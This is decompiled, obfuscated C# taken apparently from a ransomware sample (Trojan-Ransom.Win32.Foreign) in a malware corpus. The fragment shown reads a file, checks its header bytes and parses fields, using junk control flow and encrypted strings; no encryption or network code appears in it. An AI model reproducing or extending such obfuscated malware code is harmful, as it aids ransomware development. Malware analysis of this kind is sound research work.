// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 1, Version=8.93.47.49, Culture=neutral, PublicKeyToken=null
// MVID: DFA8ED2E-5616-44FF-892B-A77949B35FF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.mxlc-0e45041763d0a87cf14d630d0ef61ca2fbfdc37f1c8a9944dd0c3cfd1cf0aa8a.exe

using \u0003;
using \u0006;
using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0003
{
  internal class \u0001
  {
    public static byte[] \u0001;
    public static ushort \u0001;
    public static ulong \u0001;
    public static \u0001.\u0003[] \u0001;
    public static byte[] \u0002;
    public static \u0001.\u0002[] \u0001;
    public static string[] \u0001;

    static \u0001()
    {
      byte[] numArray1;
      try
      {
        if (true)
          numArray1 = new byte[10]
          {
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0,
            (byte) 0
          };
        else
          goto label_5;
label_3:
        numArray1[1] = (byte) 1;
        numArray1[2] = (byte) 2;
        if (true)
        {
          numArray1[3] = (byte) 3;
          numArray1[4] = (byte) 4;
        }
        else
          goto label_6;
label_5:
        numArray1[5] = (byte) 6;
label_6:
        numArray1[6] = (byte) 8;
        numArray1[7] = (byte) 8;
        if (true)
        {
          numArray1[8] = (byte) 0;
          numArray1[9] = (byte) 0;
          \u0001.\u0002 = numArray1;
        }
        else
          goto label_3;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = numArray1;
        \u0007.\u0001(ex, (object) numArray2);
        throw;
      }
    }

    public \u0001([In] string obj0)
    {
      string s;
      int[] numArray1;
      try
      {
        if (!File.Exists(obj0))
          return;
        FileSystem.FileOpen(1, obj0, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        s = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref s);
        numArray1 = new int[1]{ 1 };
        FileSystem.FileClose(numArray1);
        \u0001.\u0001 = Encoding.Default.GetBytes(s);
        if (Encoding.Default.GetString(\u0001.\u0001, 0, 15).CompareTo(\u0007.\u0001(\u000E.\u0003.\u0001(1635), \u000E.\u0003.\u0001(55))) != 0)
          throw new Exception(\u0007.\u0001(\u000E.\u0003.\u0001(1668), \u000E.\u0003.\u0001(55)));
        if (\u0001.\u0001[52] != (byte) 0)
          throw new Exception(\u0007.\u0001(\u000E.\u0003.\u0001(1733), \u000E.\u0003.\u0001(55)));
        if (Decimal.Compare(new Decimal(\u0007.\u0001(44, 4)), 4M) >= 0)
          throw new Exception(\u0007.\u0001(\u000E.\u0003.\u0001(1822), \u000E.\u0003.\u0001(55)));
        \u0001.\u0001 = checked ((ushort) \u0007.\u0001(16, 2));
        \u0001.\u0001 = \u0007.\u0001(56, 4);
        if (Decimal.Compare(new Decimal(\u0001.\u0001), 0M) == 0)
          \u0001.\u0001 = 1UL;
        \u0007.\u0001(this, 100UL);
      }
      catch (Exception ex)
      {
        string str1 = s;
        int[] numArray2 = numArray1;
        string str2 = obj0;
        \u0007.\u0001(ex, (object) str1, (object) numArray2, (object) this, (object) str2);
        throw;
      }
    }

    public struct \u0001
    {
      public long \u0001;
      public long \u0002;
    }

    public struct \u0002
    {
      public long \u0001;
      public string[] \u0001;
    }

    public struct \u0003
    {
      public long \u0001;
      public string \u0001;
      public string \u0002;
      public string \u0003;
      public long \u0002;
      public string \u0004;
    }
  }
}
